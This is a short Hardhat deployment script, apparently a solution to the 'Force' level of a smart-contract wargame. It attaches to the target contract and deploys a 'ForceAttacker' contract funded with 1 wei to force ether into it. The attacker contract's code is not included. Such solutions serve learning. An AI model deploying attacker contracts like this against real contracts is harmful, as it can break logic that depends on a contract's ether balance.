import { ethers } from "hardhat";

const CONTRACT_ADDRESS = "0xea9c7Abf6EFB088D610f660dc844974dd3D3258D";
const CONTRACT_NAME = "Force";
const ATTACKER_NAME = "ForceAttacker";

async function main() {
  const factory = await ethers.getContractFactory(CONTRACT_NAME);
  const contract = factory.attach(CONTRACT_ADDRESS);

  const attackerFactory = await ethers.getContractFactory(ATTACKER_NAME);
  const attackerContract = await attackerFactory.deploy(contract.address, { value: 1 });
  await attackerContract.deployed();
}

main().catch(error => {
  console.error(error);
  process.exit(1);
});
